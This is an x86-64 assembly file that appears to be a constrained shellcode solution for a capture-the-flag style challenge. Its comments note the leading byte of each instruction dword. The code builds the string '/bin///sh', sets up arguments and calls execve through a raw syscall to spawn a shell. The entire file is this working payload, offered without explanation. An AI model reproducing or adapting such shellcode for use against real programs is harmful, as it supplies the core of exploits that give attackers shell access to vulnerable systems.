.intel_syntax noprefix
.global _start

# The commented numbers are starting bytes of
# dwords in the assembled instructions

_start:
cmp eax, eax	# 0x39
jz end

.byte 0x40
.string "/bin///sh"	# 0x73
.byte 0

.byte 0x74
part1:
pop rsi
jmp part2

.byte 0x75
part2:
mov rdx, rsi
jna part3	# 0x76

part3:
lea rdi, [rsi - 0x37]	# 0x7e
jmp part4

.byte 0x7f
part4:
push rdi
jmp part5

.byte 0x80
part5:
push 0
push rdi
add ecx, 1	# 0x83
mov rsi, rsp	# 0x89
jmp part6

.byte 0x8a
part6:
add al, 59
push -112
syscall

end:
call part1	# 0xe8

